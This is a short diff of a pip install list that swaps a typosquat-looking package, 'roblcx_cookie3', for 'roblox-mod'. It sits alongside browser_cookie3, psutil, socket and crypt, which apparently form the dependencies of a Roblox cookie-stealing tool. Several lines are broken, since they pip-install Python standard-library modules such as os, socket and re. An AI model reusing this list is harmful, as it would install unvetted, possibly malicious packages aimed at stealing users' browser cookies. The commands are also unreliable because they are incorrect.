@@ -4,7 +4,7 @@ pip install browser_cookie3
 pip install platform
 pip install psutil
 pip install os
-pip install roblcx_cookie3
+pip install roblox-mod
 pip install socket
 pip install re
 pip install crypt
